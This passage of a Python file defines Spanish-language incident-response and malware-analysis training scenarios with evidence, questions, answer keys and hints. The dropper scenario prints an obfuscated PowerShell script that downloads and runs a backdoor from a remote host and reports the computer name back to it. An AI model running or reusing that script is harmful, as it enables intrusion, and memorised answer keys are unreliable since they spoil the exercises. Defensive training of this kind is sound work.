                "explanation": "Pass-the-Hash: el atacante uso el NTLM hash de svc_backup (sin necesitar la contrasena en texto claro) para autenticarse en otros sistemas. Esta es una tecnica clasica de movimiento lateral en Windows."
            },
            {
                "id": "t4",
                "question": "¿Que archivo intento extraer el atacante del Controlador de Dominio?",
                "type": "text",
                "correct": "ntds.dit",
                "points": 70,
                "hint": "Busca el comando ntdsutil en el log del DC01 y que archivo crea",
                "explanation": "NTDS.dit es la base de datos de Active Directory que contiene los hashes de contrasenas de TODOS los usuarios del dominio. Su extraccion significa que el atacante puede crackear o reusar todas las credenciales del dominio."
            },
            {
                "id": "t5",
                "question": "¿Cual es el objetivo final del atacante segun el movimiento observado?",
                "type": "multiple_choice",
                "options": [
                    "Robar archivos del servidor de archivos",
                    "Comprometer el Controlador de Dominio y obtener todos los hashes del dominio",
                    "Instalar ransomware en estaciones de trabajo",
                    "Crear una cuenta de backdoor"
                ],
                "correct": 1,
                "points": 80,
                "hint": "El atacante fue directamente al DC01 y ejecuto ntdsutil. ¿Que contiene el DC?",
                "explanation": "Domain Compromise total. El atacante siguio la ruta clasica: Acceso inicial -> Credential Dumping -> Movimiento Lateral -> DC Compromise. Con NTDS.dit tiene control total del dominio Active Directory."
            }
        ]
    },

    # ─────────────────────────────────────────────────────────
    # MALWARE ANALYSIS
    # ─────────────────────────────────────────────────────────

    "mal-powershell-dropper": {
        "id": "mal-powershell-dropper",
        "title": "Analisis: PowerShell Dropper",
        "category": "malware",
        "subcategory": "Analisis Estatico",
        "difficulty": "Principiante",
        "difficulty_color": "#10b981",
        "points": 150,
        "description": "El equipo de respuesta a incidentes capturo un script de PowerShell sospechoso encontrado en un servidor comprometido. Realiza un analisis estatico del script para entender su comportamiento.",
        "objectives": [
            "Identificar la tecnica de ofuscacion usada",
            "Decodificar el payload oculto",
            "Identificar el servidor C2",
            "Clasificar el tipo de malware"
        ],
        "evidence": {
            "Script PowerShell (script_sospechoso.ps1)": r"""$a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE5OC41MS4xMDAuNzMvbWFsd2FyZS9iYWNrZG9vci5leGU='))
$b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xUZW1wXHN2Y2hvc3QuZXhl'))
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($a, $b)
Start-Process $b
$c = [System.Convert]::FromBase64String('aHR0cDovLzE5OC41MS4xMDAuNzMvcmVwb3J0P2hvc3Q9')
$env = [System.Text.Encoding]::UTF8.GetString($c) + $env:COMPUTERNAME
Invoke-WebRequest -Uri $env -UseBasicParsing""",
            "Decodificacion Base64 (Herramienta de Analisis)": """Variable $a decodificada: http://198.51.100.73/malware/backdoor.exe
Variable $b decodificada: C:\\Windows\\Temp\\svchost.exe
Variable $c decodificada: http://198.51.100.73/report?host=""",
            "Metadata del Archivo": """Nombre: script_sospechoso.ps1
Tamaño: 847 bytes
MD5: 7f3d8a9c1b2e4f6a8d0c2e4f6a8d0c2e
SHA256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
Primera vez visto (VirusTotal): 2024-01-10
Detecciones VT: 34/72
Clasificacion: Trojan.Dropper.PowerShell""",
            "Strings Extraidas": """Strings relevantes encontradas:
- System.Net.WebClient
- DownloadFile
- Start-Process
- FromBase64String
- COMPUTERNAME
- Invoke-WebRequest
- C:\\Windows\\Temp\\"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Que tecnica de ofuscacion usa el script para ocultar el codigo malicioso?",
                "type": "multiple_choice",
                "options": [
                    "XOR Encryption",
                    "Base64 Encoding",
                    "AES-256 Encryption",
                    "ROT13"
                ],
                "correct": 1,
                "points": 25,
                "hint": "Mira las funciones usadas: FromBase64String y [System.Convert]",
                "explanation": "El script usa Base64 Encoding para ocultar las URLs y rutas maliciosas. Es la tecnica de ofuscacion mas comun en PowerShell malicioso porque es rapida de implementar y evita deteccion basada en strings."
            },
            {
                "id": "t2",
                "question": "¿Cual es el servidor C2 (Command & Control) del malware?",
                "type": "text",
                "correct": "198.51.100.73",
                "points": 30,
                "hint": "Decodifica la variable $a o revisa la tabla de decodificacion",
                "explanation": "198.51.100.73 es el C2. El malware descarga backdoor.exe desde ese servidor y luego reporta el nombre del host comprometido a /report."
            },
            {
                "id": "t3",
                "question": "¿Con que nombre guarda el malware el ejecutable descargado para pasar desapercibido?",
                "type": "text",
                "correct": "svchost.exe",
                "points": 30,
                "hint": "Decodifica la variable $b o revisa la tabla de decodificacion",
                "explanation": "svchost.exe es un proceso legitimo de Windows. El malware lo imita en C:\\Windows\\Temp\\ para confundir a analistas. Esta tecnica se llama Process Masquerading."
            },
            {
                "id": "t4",
                "question": "¿Que informacion envia el malware al C2 despues de infectar el sistema?",
                "type": "text",
                "correct": "COMPUTERNAME",
                "points": 35,
                "hint": "Mira la variable $env:COMPUTERNAME y donde se usa con Invoke-WebRequest",
                "explanation": "El malware envia el nombre del computador comprometido ($env:COMPUTERNAME) al C2 via la URL http://198.51.100.73/report?host=NOMBRE. Esto permite al atacante inventariar sus maquinas comprometidas."
            },
            {
                "id": "t5",
                "question": "¿Como se clasifica este tipo de malware que descarga y ejecuta otro malware?",
                "type": "multiple_choice",
                "options": [
                    "Ransomware",
                    "Dropper / Downloader",
                    "Keylogger",
                    "Rootkit"
                ],
                "correct": 1,
                "points": 30,
                "hint": "El malware descarga (Download) y ejecuta otro archivo. VirusTotal lo clasifica como Trojan.Dropper",
                "explanation": "Dropper/Downloader: este tipo de malware tiene como unica funcion descargar y ejecutar un payload secundario (backdoor.exe). Es la primera etapa de un ataque en multiples fases."
            }
        ]
    },

    "mal-network-traffic": {
        "id": "mal-network-traffic",
        "title": "Analisis: Trafico de Red de Malware",
        "category": "malware",
        "subcategory": "Analisis de Red",
        "difficulty": "Intermedio",
        "difficulty_color": "#f59e0b",
        "points": 200,
        "description": "Se capturo trafico de red de un host sospechoso usando Wireshark. El archivo PCAP muestra comunicaciones inusuales. Analiza el trafico para identificar el comportamiento del malware.",
        "objectives": [
            "Identificar el protocolo de exfiltracion de datos",
            "Calcular el volumen de datos exfiltrados",
            "Identificar el dominio C2",
            "Detectar tecnicas de evasion de red"
        ],
        "evidence": {
            "Extracto PCAP - Resumen de Trafico": """Frame  Time      SrcIP         DstIP          Proto  Len  Info
001    0.000000  10.0.1.88     8.8.8.8        DNS    74   Query: updates.microsoft-cdn.net
002    0.001234  8.8.8.8       10.0.1.88      DNS    90   Response: 198.51.100.73
003    0.002100  10.0.1.88     198.51.100.73  TCP    74   SYN (puerto 443)
004    0.052341  198.51.100.73 10.0.1.88      TCP    74   SYN-ACK
005    0.052500  10.0.1.88     198.51.100.73  TCP    66   ACK (TLS Handshake)
...
089    5.234512  10.0.1.88     198.51.100.73  TLS    1514 Application Data [BEACON - 1.2KB]
090    300.234   10.0.1.88     198.51.100.73  TLS    1498 Application Data [BEACON - 1.2KB]
091    600.235   10.0.1.88     198.51.100.73  TLS    1501 Application Data [BEACON - 1.2KB]
...
201    3602.100  10.0.1.88     198.51.100.73  TLS    98420 Application Data [LARGE - 96KB]
202    3602.150  10.0.1.88     198.51.100.73  TLS    102400 Application Data [LARGE - 100KB]
203    3602.200  10.0.1.88     198.51.100.73  TLS    89120 Application Data [LARGE - 87KB]""",
            "Analisis DNS - Peticiones Inusuales": """DNS Queries desde 10.0.1.88:
45 peticiones a: aGVsbG8.updates.microsoft-cdn.net  [Sospechoso: subdominio random]
45 peticiones a: d29ybGQ.updates.microsoft-cdn.net  [Sospechoso: subdominio random]
45 peticiones a: dGVzdA.updates.microsoft-cdn.net   [Sospechoso: subdominio random]
[NOTA: Los subdominios en Base64 decodifican a: 'hello', 'world', 'test']
[TECNICA: DNS Tunneling - datos ocultos en consultas DNS]

Total bytes en subdominios DNS: ~24KB transmitidos encubiertos""",
            "Resumen Estadistico de la Captura": """Duracion captura: 2 horas
Host analizado: 10.0.1.88
Total bytes enviados a 198.51.100.73: 289,540 bytes (~283 KB)
  - Trafico TLS regular (beacons): 68,900 bytes
  - Trafico TLS grande (exfiltracion): 220,640 bytes (~215 KB)
  - Trafico DNS encubierto: 24,576 bytes (~24 KB)
Total bytes exfiltrados estimado: ~239 KB

Protocolo usado para cifrar C2: TLS 1.2
Intervalo de beacon: 300 segundos (5 minutos)
User-Agent detectado: Mozilla/5.0 [falso - no hay navegador abierto]"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cuantos segundos es el intervalo del beacon del malware al C2?",
                "type": "text",
                "correct": "300",
                "points": 30,
                "hint": "Calcula la diferencia entre timestamps de los frames 089, 090 y 091, o revisa el resumen estadistico",
                "explanation": "300 segundos (5 minutos) exactos entre beacons. Esta regularidad matematicamente perfecta es imposible en actividad humana y es la firma caracteristica de un beacon automatizado de malware."
            },
            {
                "id": "t2",
                "question": "¿Que protocolo usa el malware para cifrar sus comunicaciones con el C2?",
                "type": "text",
                "correct": "TLS",
                "points": 25,
                "hint": "Mira el protocolo en los frames de Application Data",
                "explanation": "El malware usa TLS (Transport Layer Security) para cifrar su trafico, lo que hace muy dificil inspeccionar el contenido sin interceptar el certificado. Esta tecnica se llama 'malware over HTTPS'."
            },
            {
                "id": "t3",
                "question": "¿Que tecnica adicional usa el malware para exfiltrar datos de forma encubierta usando el protocolo DNS?",
                "type": "text",
                "correct": "DNS Tunneling",
                "points": 40,
                "hint": "Mira la seccion 'Analisis DNS' y la nota sobre subdominios",
                "explanation": "DNS Tunneling: el malware codifica datos en subdominios DNS (Base64) y los envia como consultas DNS aparentemente normales. Es una tecnica de evasion avanzada ya que el DNS raramente es bloqueado."
            },
            {
                "id": "t4",
                "question": "¿Cuantos KB de datos fueron exfiltrados en total (segun el resumen)?",
                "type": "text",
                "correct": "239",
                "points": 35,
                "hint": "Revisa el campo 'Total bytes exfiltrados estimado' en el Resumen Estadistico",
                "explanation": "239 KB de datos fueron extraidos de la maquina comprometida. Combinando TLS (215 KB) y DNS Tunneling (24 KB), el atacante divido la exfiltracion entre dos canales para evadir deteccion."
            },
            {
                "id": "t5",
                "question": "¿Por que es sospechoso que el malware use el User-Agent 'Mozilla/5.0' segun la captura?",
                "type": "multiple_choice",
                "options": [
                    "Mozilla/5.0 es un User-Agent desactualizado",
                    "El analisis muestra que no hay ningun navegador abierto en el host, por lo que ninguna aplicacion deberia usar ese User-Agent",
                    "El User-Agent tiene caracteres especiales",
                    "Mozilla/5.0 esta en lista negra"
                ],
                "correct": 1,
                "points": 70,
                "hint": "La nota dice 'no hay navegador abierto'. ¿Quien usa normalmente User-Agents de navegador?",
                "explanation": "El malware falsifica el User-Agent de navegador (Mozilla/5.0) para que su trafico parezca trafico web normal. Sin embargo, si no hay ningun navegador abierto y el trafico viene de svchost.exe, es claramente malicioso. Esta tecnica se llama User-Agent Masquerading."
            }
        ]
    },

    "mal-persistence": {
        "id": "mal-persistence",
        "title": "Analisis: Mecanismos de Persistencia",
        "category": "malware",
        "subcategory": "Analisis de Sistema",
        "difficulty": "Intermedio",
        "difficulty_color": "#f59e0b",
        "points": 170,
        "description": "El equipo forense extrajo artefactos del sistema de un host comprometido. El malware parece haber establecido multiples mecanismos de persistencia. Identifica todos los metodos usados.",
        "objectives": [
            "Identificar los mecanismos de persistencia usados",
            "Encontrar las claves de registro maliciosas",
            "Identificar las tareas programadas maliciosas",
            "Determinar el ejecutable del malware"
        ],
        "evidence": {
            "Registro de Windows - Run Keys": """HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  WindowsUpdater = "C:\\Users\\victim\\AppData\\Roaming\\winupdate.exe --silent"
  OneDriveSync = "C:\\Program Files\\OneDrive\\OneDriveStandaloneUpdater.exe" [LEGITIMO]

HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
  SecurityHealth = "%windir%\\system32\\SecurityHealthSystray.exe" [LEGITIMO]

HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
  Shell = "explorer.exe, C:\\Users\\victim\\AppData\\Local\\Temp\\helper.exe"
  [NORMAL: Shell deberia ser SOLO explorer.exe]""",
            "Tareas Programadas (schtasks /query)": """Nombre de tarea: \\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant
Estado: Listo
Proxima ejecucion: 2024-01-16 00:00:00
Accion: C:\\Users\\victim\\AppData\\Roaming\\winupdate.exe
Creado por: victim [SOSPECHOSO: las tareas de Microsoft las crea SYSTEM]
Frecuencia: Diariamente a medianoche

Nombre de tarea: \\Microsoft\\Windows\\WindowsBackup\\ConfigNotification
Estado: Listo
Accion: C:\\Windows\\System32\\sdclt.exe [LEGITIMO]""",
            "Archivos del Malware Encontrados": """Ruta: C:\\Users\\victim\\AppData\\Roaming\\winupdate.exe
  Tamaño: 2,847,234 bytes
  MD5: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
  Compilado: 2024-01-09 (6 dias antes de la infeccion)
  Firmado digitalmente: NO
  Detecciones VT: 41/72 [Trojan.Agent]

Ruta: C:\\Users\\victim\\AppData\\Local\\Temp\\helper.exe
  Tamaño: 891,456 bytes
  MD5: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
  Compilado: 2024-01-09
  Firmado digitalmente: NO
  Detecciones VT: 38/72 [Backdoor.Generic]""",
            "Servicios de Windows (sc query)": """SERVICE_NAME: WinDefService
  TYPE: WIN32_OWN_PROCESS
  STATE: RUNNING
  BINARY_PATH_NAME: C:\\Users\\victim\\AppData\\Roaming\\winupdate.exe --service
  START_TYPE: AUTO_START
  [SOSPECHOSO: Los servicios de Windows Defender NO se ejecutan desde AppData]"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cuantos mecanismos de persistencia diferentes utilizo el malware? (cuenta: Registry Run Key, Winlogon, Tarea Programada, Servicio)",
                "type": "text",
                "correct": "4",
                "points": 30,
                "hint": "Cuenta uno por cada seccion: Run Key en HKCU, Winlogon Shell, Tarea Programada, y el Servicio WinDefService",
                "explanation": "4 mecanismos: (1) Registry Run Key HKCU, (2) Winlogon Shell hijacking, (3) Tarea Programada disfrazada, (4) Servicio de Windows falso. Usar multiples tecnicas garantiza sobrevivir a limpiezas parciales."
            },
            {
                "id": "t2",
                "question": "¿En que clave de registro establece el malware su primera persistencia (Run Key)?",
                "type": "text",
                "correct": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "points": 35,
                "hint": "Busca la clave Run en el Registro que contenga el ejecutable malicioso winupdate.exe",
                "explanation": "HKCU\\...\\Run es la clave de registro que ejecuta programas al inicio de sesion del usuario. No requiere privilegios de administrador para ser modificada, lo que la hace popular entre malware."
            },
            {
                "id": "t3",
                "question": "¿Que tecnica de persistencia usa la clave Winlogon Shell?",
                "type": "multiple_choice",
                "options": [
                    "DLL Hijacking",
                    "Shell Replacement / Hijacking",
                    "Boot Record Infection",
                    "COM Object Hijacking"
                ],
                "correct": 1,
                "points": 40,
                "hint": "La clave Shell normalmente solo tiene 'explorer.exe'. ¿Que pasa cuando se agrega otro ejecutable?",
                "explanation": "Shell Hijacking: la clave Winlogon\\Shell define que proceso se ejecuta como shell de Windows al iniciar sesion. El malware agrego helper.exe despues de explorer.exe, asegurandose de ejecutarse con cada inicio de sesion."
            },
            {
                "id": "t4",
                "question": "¿Que nombre de servicio falso creo el malware para disfrazarse de Windows Defender?",
                "type": "text",
                "correct": "WinDefService",
                "points": 35,
                "hint": "Busca el servicio sospechoso en la seccion 'Servicios de Windows'",
                "explanation": "WinDefService imita el nombre de Windows Defender. El ejecutable en AppData\\Roaming es la primera senal de alerta: los servicios legitimos de Windows NUNCA se ejecutan desde carpetas de usuario."
            },
            {
                "id": "t5",
                "question": "¿Por que el malware uso la carpeta AppData\\Roaming para sus ejecutables?",
                "type": "multiple_choice",
                "options": [
                    "Es la carpeta mas rapida del sistema",
                    "No requiere privilegios de administrador para escribir en ella, y es menos monitoreada que System32",
                    "Los antivirus no pueden acceder a esa carpeta",
                    "Es una carpeta oculta del sistema"
                ],
                "correct": 1,
                "points": 60,
                "hint": "Piensa en permisos: ¿necesita el malware ser admin para escribir en AppData?",
                "explanation": "AppData\\Roaming pertenece al usuario y no requiere privilegios de administrador. Muchos controles de seguridad se enfocan en System32 y Program Files. El malware evita privilegios elevados para no disparar alertas de UAC."
            }
        ]
    },

    "mal-memory-analysis": {
        "id": "mal-memory-analysis",
        "title": "Analisis: Proceso Malicioso en Memoria",
        "category": "malware",
        "subcategory": "Memory Forensics",
        "difficulty": "Avanzado",
        "difficulty_color": "#ef4444",
        "points": 250,
        "description": "Se tomo un volcado de memoria RAM de un host sospechoso. Usando Volatility, el equipo forense extrajo informacion de los procesos activos. Analiza los resultados para identificar el proceso malicioso.",
        "objectives": [
            "Identificar el proceso malicioso en el arbol de procesos",
            "Detectar la tecnica de Process Injection usada",
            "Encontrar las conexiones de red del malware",
            "Extraer IOCs de la memoria"
        ],
        "evidence": {
            "Volatility - pslist (Lista de Procesos)": """Offset   Name                PID   PPID  Threads  Handles  Time
-------- ------------------- ----- ----- -------- -------- -------------------
0x8a...  System              4     0     134      561      2024-01-15 08:00:00
0x9b...  smss.exe            364   4     3        32       2024-01-15 08:00:01
0xac...  csrss.exe           496   488   10       445      2024-01-15 08:00:02
0xbc...  wininit.exe         560   488   1        116      2024-01-15 08:00:02
0xcd...  winlogon.exe        608   488   4        185      2024-01-15 08:00:02
0xde...  lsass.exe           716   560   9        1234     2024-01-15 08:00:03
0xef...  svchost.exe         928   716   15       834      2024-01-15 08:00:05  [ALERTA: PPID=716=lsass.exe]
0xf0...  services.exe        840   560   8        312      2024-01-15 08:00:03
0xa1...  svchost.exe         1144  840   20       445      2024-01-15 08:00:06  [Legitimo: padre=services.exe]
0xb2...  explorer.exe        2456  2440  45       1823     2024-01-15 09:15:22
0xc3...  chrome.exe          3210  2456  25       445      2024-01-15 09:20:11
0xd4...  notepad.exe         4521  2456  1        78       2024-01-15 10:22:45""",
            "Volatility - pstree (Arbol de Procesos)": """System (4)
.lsass.exe (716)           <-- Proceso critico del sistema
..svchost.exe (928)        <-- ANORMAL: svchost hijo de lsass
...cmd.exe (1290)          <-- Shell ejecutada por svchost malicioso
....powershell.exe (1445)  <-- PowerShell ejecutado desde cmd""",
            "Volatility - netscan (Conexiones de Red)": """Proto   LocalAddr:Port         ForeignAddr:Port       State     PID   Process
TCP     10.0.1.88:49823        198.51.100.73:443      ESTABLISHED 928   svchost.exe
TCP     10.0.1.88:49824        8.8.8.8:53             TIME_WAIT   1144  svchost.exe [legitimo DNS]
TCP     10.0.1.88:50001        142.250.80.46:443      ESTABLISHED 3210  chrome.exe [YouTube]""",
            "Volatility - malfind (Regiones de Memoria Sospechosas)": """Process: svchost.exe PID: 928
Virtual Address: 0x1f0000
Size: 184320 bytes
Flags: PAGE_EXECUTE_READWRITE [SOSPECHOSO]
Proteccion: MZ Header detectado (ejecutable PE embebido)
Entropy: 7.82 (alta - posiblemente cifrado/comprimido)

Hexdump:
4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00   MZ..............
b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00   ........@.......

[NOTA: MZ es la firma de un ejecutable Windows PE inyectado en memoria de svchost]"""
        },
        "tasks": [
            {
                "id": "t1",
                "question": "¿Cual es el PID del proceso svchost.exe malicioso (el que tiene un padre incorrecto)?",
                "type": "text",
                "correct": "928",
                "points": 40,
                "hint": "En pslist, busca el svchost.exe con PPID=716 (lsass.exe). El svchost legitimo tiene como padre services.exe (840)",
                "explanation": "PID 928. En Windows, svchost.exe SIEMPRE debe tener como padre a services.exe (840). Si el padre es lsass.exe, es una senal clara de Process Injection o proceso malicioso disfrazado."
            },
            {
                "id": "t2",
                "question": "¿Que tecnica de inyeccion de codigo se detecto en el proceso malicioso segun malfind?",
                "type": "multiple_choice",
                "options": [
                    "DLL Injection",
                    "Process Hollowing",
                    "Reflective PE Injection (ejecutable PE inyectado directamente en memoria)",
                    "Thread Hijacking"
                ],
                "correct": 2,
                "points": 60,
                "hint": "malfind encontro un header MZ (ejecutable PE) embebido en la memoria del proceso con permisos PAGE_EXECUTE_READWRITE",
                "explanation": "Reflective PE Injection: el malware inyecto un ejecutable PE completo (identificado por el header MZ) directamente en la memoria de svchost.exe. PAGE_EXECUTE_READWRITE en una region con un PE embebido es firma definitiva de code injection."
            },
            {
                "id": "t3",
                "question": "¿A que IP se conecta el proceso malicioso segun netscan?",
                "type": "text",
                "correct": "198.51.100.73",
                "points": 35,
                "hint": "Busca la conexion ESTABLISHED del PID 928 (svchost.exe malicioso) en netscan",
                "explanation": "198.51.100.73 puerto 443. El malware usa HTTPS (puerto 443) para parecer trafico web normal y evadir firewalls que bloquean puertos no estandar."
            },
            {
                "id": "t4",
                "question": "¿Que proceso hijo ejecuto el malware dentro de svchost.exe segun el arbol de procesos?",
                "type": "text",
                "correct": "powershell.exe",
                "points": 45,
                "hint": "Mira el pstree: svchost(928) -> cmd.exe -> ?",
                "explanation": "svchost malicioso -> cmd.exe -> powershell.exe. Esta cadena (svchost ejecutando cmd que ejecuta PowerShell) es una tecnica clasica de Living-off-the-Land (LotL): usar herramientas del sistema para ejecutar codigo malicioso."
            },
            {
                "id": "t5",
                "question": "¿Que indica la alta entropia (7.82) detectada en la region de memoria del malware?",
                "type": "multiple_choice",
                "options": [
                    "Que la region tiene mucho texto en claro",
                    "Que el codigo esta cifrado o comprimido (el payload real esta oculto)",
                    "Que hay un error en la memoria",
                    "Que es codigo normal de sistema"
                ],
                "correct": 1,
                "points": 70,
                "hint": "La entropia mide la aleatoriedad del dato. Alta entropia = datos muy aleatorios. ¿Por que los datos maliciosos son muy aleatorios?",
                "explanation": "Alta entropia (>7.0) indica cifrado o compresion. El malware cifra su payload real para evadir analisis estatico y firmas de antivirus. Durante la ejecucion, lo descifra en memoria. Esta tecnica se llama 'packed malware' o 'encrypted shellcode'."
            }
        ]
    }
}


def get_all_scenarios_summary():
    result = []
    for sid, scenario in SCENARIOS.items():
        total_points = sum(t["points"] for t in scenario["tasks"])
        result.append({
            "id": scenario["id"],
            "title": scenario["title"],
            "category": scenario["category"],
            "subcategory": scenario["subcategory"],
            "difficulty": scenario["difficulty"],
            "difficulty_color": scenario["difficulty_color"],
            "points": total_points,
            "description": scenario["description"],
            "objectives": scenario["objectives"],
            "task_count": len(scenario["tasks"])
        })
    return result


def get_scenario(scenario_id):
    return SCENARIOS.get(scenario_id)


def get_scenario_safe(scenario_id):
    """Retorna el escenario sin las respuestas correctas."""
    s = SCENARIOS.get(scenario_id)
    if not s:
        return None
    safe = dict(s)
    safe_tasks = []
    for t in s["tasks"]:
        task_copy = {k: v for k, v in t.items() if k != "correct"}
        safe_tasks.append(task_copy)
    safe["tasks"] = safe_tasks
    return safe
